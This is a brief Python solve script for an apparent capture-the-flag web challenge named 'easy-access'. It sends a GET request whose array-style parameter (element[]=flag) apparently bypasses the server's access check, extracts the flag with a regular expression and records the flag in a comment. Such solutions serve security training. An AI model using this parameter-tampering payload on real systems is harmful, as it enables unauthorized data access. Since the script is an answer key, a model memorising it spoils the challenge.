import requests
import re

site = "http://easy-access.challs.olicyber.it"

r = requests.get(f"{site}//element?element[]=flag").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{¿who_does_not_love_easy_access?}